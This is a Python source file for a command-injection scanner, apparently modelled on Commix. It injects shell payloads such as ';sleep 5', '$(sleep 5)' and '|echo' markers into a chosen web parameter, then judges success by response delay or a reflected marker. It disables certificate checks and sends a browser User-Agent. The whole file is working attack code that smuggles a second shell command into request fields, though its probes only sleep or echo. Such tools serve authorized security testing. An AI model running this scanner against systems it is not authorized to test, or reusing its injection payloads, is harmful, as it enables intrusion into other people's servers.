#!/usr/bin/env python
"""cmd_inject.py — command injection tester (Commix-style).

Tests OS-command injection via timing (sleep-based) + error markers across
common injection points (;, |, &&, ||, backticks, $(), newline). Time-based
is the primary signal (a controlled delay = the command executed).

Usage: python cmd_inject.py <url> [--param name] [--method GET|POST]
       [--data 'k=v&k2=v2'] [--concurrency 4]
"""
import argparse, json, sys, time, urllib.request, urllib.parse, urllib.error, ssl

PAYLOADS = [
    ("semi+sleep", ";sleep 5"),
    ("pipe+sleep", "|sleep 5"),
    ("and+sleep", "&&sleep 5"),
    ("backtick", "`sleep 5`"),
    ("dollar", "$(sleep 5)"),
    ("newline", "\nsleep 5"),
    ("semi+echo", ";echo redan_cmdi_$$"),
    ("pipe+echo", "|echo redan_cmdi_$$"),
]

def test_payload(url, param, payload, method, data_template, ctx):
    """Send the payload in the param; return timing + reflection."""
    marker = "redan_cmdi"
    injected = payload.replace("$$", marker)
    t0 = time.time()
    try:
        if method == "POST":
            post = data_template.replace(f"{param}=__INJECT__", f"{param}={urllib.parse.quote(injected)}")
            req = urllib.request.Request(url, data=post.encode(), method="POST")
        else:
            sep = "&" if "?" in url else "?"
            req = urllib.request.Request(f"{url}{sep}{param}={urllib.parse.quote(injected)}")
        req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36")
        if method == "POST": req.add_header("Content-Type", "application/x-www-form-urlencoded")
        with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
            body = r.read(20000); dt = time.time() - t0
            reflected = marker.encode() in body
            return {"payload": payload, "label": None, "time_s": round(dt,2), "delayed": dt > 4.5, "reflected_marker": reflected, "status": r.status}
    except urllib.error.HTTPError as e:
        dt = time.time() - t0
        try: body = e.read(20000)
        except: body = b""
        return {"payload": payload, "time_s": round(dt,2), "delayed": dt > 4.5, "reflected_marker": marker.encode() in body, "status": e.code}
    except Exception as e:
        dt = time.time() - t0
        return {"payload": payload, "time_s": round(dt,2), "delayed": dt > 4.5, "reflected_marker": False, "error": str(e)[:100]}

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url")
    ap.add_argument("--param", required=True, help="parameter to inject into")
    ap.add_argument("--method", choices=["GET","POST"], default="GET")
    ap.add_argument("--data", default="", help="POST body template (use __INJECT__ as placeholder for the param value)")
    ap.add_argument("--concurrency", type=int, default=4)
    args = ap.parse_args()
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    data_tmpl = args.data or f"{args.param}=__INJECT__"
    # baseline (benign)
    t0 = time.time()
    try:
        req = urllib.request.Request(args.url, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"})
        with urllib.request.urlopen(req, context=ctx, timeout=15) as r: r.read(1000)
        baseline_t = time.time() - t0
    except: baseline_t = 1.0
    results = []
    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futures = {pool.submit(test_payload, args.url, args.param, p[1], args.method, data_tmpl, ctx): p[0] for p in PAYLOADS}
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result(); r["label"] = futures[fut]; r["baseline_s"] = round(baseline_t,2); results.append(r)
    results.sort(key=lambda x: x.get("time_s",0), reverse=True)
    confirmed = [r for r in results if r.get("delayed") or r.get("reflected_marker")]
    print(json.dumps({"target": args.url, "param": args.param, "ok": True, "baseline_s": round(baseline_t,2),
        "payloads_tested": len(results), "confirmed": len(confirmed),
        "verdict": "COMMAND INJECTION CONFIRMED" if confirmed else "no command injection signal",
        "results": results, "confirmed_details": confirmed,
        "note": "a >=4.5s delay on a sleep payload = the command executed (time-based cmdi). Reflected marker = echo executed."}, indent=2))

if __name__ == "__main__":
    main()
